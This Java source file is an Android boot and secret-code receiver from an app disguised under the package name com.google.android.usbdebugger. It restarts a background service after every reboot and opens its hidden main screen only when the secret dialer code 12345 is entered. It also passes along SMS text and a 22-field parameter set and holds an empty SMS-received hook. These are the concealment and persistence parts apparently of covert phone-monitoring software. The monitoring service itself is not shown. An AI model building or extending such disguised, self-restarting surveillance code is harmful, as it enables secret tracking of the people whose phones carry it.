package com.google.android.usbdebugger;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.util.Log;

import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;


public class BootDeviceReceiver extends BroadcastReceiver
{
    private static final String TAG = "BootDeviceReceiver";

    private String DateTime() {
        Date dt = new Date();
        @SuppressLint("SimpleDateFormat")
        SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        return ft2.format(dt);
    }

    public void createParams(Context context, ArrayList param){
        DBHelper dbh = new DBHelper(context);
        try (SQLiteDatabase db = dbh.getWritableDatabase()) {
            ContentValues data = new ContentValues();
            data.put("VC", param.get(0).toString());
            data.put("SC", param.get(1).toString());
            data.put("FT", param.get(2).toString());
            data.put("PT", param.get(3).toString());
            data.put("FD", param.get(4).toString());
            data.put("US", param.get(5).toString());
            data.put("PS", param.get(6).toString());
            data.put("GP", param.get(7).toString());
            data.put("GP_T", param.get(8).toString());
            data.put("CN", param.get(9).toString());
            data.put("MS", param.get(10).toString());
            data.put("DC", param.get(11).toString());
            data.put("PR", param.get(12).toString());
            data.put("BS", param.get(13).toString());
            data.put("SM", param.get(14).toString());
            data.put("MI", param.get(15).toString());
            data.put("FLC", param.get(16).toString());
            data.put("RS", param.get(17).toString());
            data.put("DBC", param.get(18).toString());
            data.put("SH", param.get(19).toString());
            data.put("XML_T", param.get(20).toString());
            data.put("DUR", param.get(21).toString());

            db.update("Parametrs", data, "1=1", null);

        } catch (Exception ex){
            try(SQLiteDatabase dbex = dbh.getWritableDatabase()){
                dbh.insert_Exeption(dbex, "createParams()Update","Exception", ex.getMessage(), DateTime());
            }
        }
    }

    void startService(Context context, String reason, ArrayList params) {
        Intent mIntent = new Intent(context, MyService.class);
        mIntent.putExtra("sms_body", reason);
        mIntent.putExtra("Array", (Serializable) params);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(mIntent);
        } else {
            context.startService(mIntent);
        }
    }

    @Override
    public void onReceive(Context context, Intent intent)
    {
        String action = intent.getAction();
        Log.d(TAG, "Received action: " + action);

        if (action == null) return;

        if(action.equals("REFRESH_THIS"))
        {
            ArrayList params = (ArrayList) intent.getSerializableExtra("Array");
            if (params != null && !params.isEmpty()) {
                createParams(context, params);
                String smsBody = intent.getStringExtra("sms_body");
                startService(context, smsBody, params);
            }
        }

        if(action.equals("android.provider.Telephony.SECRET_CODE")) {
            String ss = intent.getDataString();
            if(ss != null && ss.equals("android_secret_code://12345")) {
                try {
                    Intent mIntent = new Intent(context, MainActivity.class);
                    mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(mIntent);
                }
                catch (ActivityNotFoundException ex) {
                    Log.e("ERR1 Activit", "ActivityNotFoundException" + ex.getLocalizedMessage());
                }
            }
        }

        // ИСПРАВЛЕНО: Возвращена простая и надежная логика запуска сервиса через AlarmManager
        if(Intent.ACTION_BOOT_COMPLETED.equals(action) || "android.intent.action.QUICKBOOT_POWERON".equals(action))
        {
            Log.d(TAG, "Boot completed. Scheduling service start.");
            Intent serviceIntent = new Intent(context, MyService.class);
            serviceIntent.putExtra("sms_body", "StartUp");

            int flags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) ? PendingIntent.FLAG_IMMUTABLE : 0;
            PendingIntent pendingIntent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 pendingIntent = PendingIntent.getForegroundService(context, 0, serviceIntent, flags);
            } else {
                 pendingIntent = PendingIntent.getService(context, 0, serviceIntent, flags);
            }

            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                long triggerAtMillis = System.currentTimeMillis() + 15000;
                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);
                Log.d(TAG, "Service start scheduled in 15 seconds.");
            } else {
                 Log.e(TAG, "AlarmManager is null, cannot schedule service start.");
            }
        }

        if ("android.provider.Telephony.SMS_RECEIVED".equalsIgnoreCase(action)) {
            // SMS receiving logic can be placed here if needed
        }
    }
}
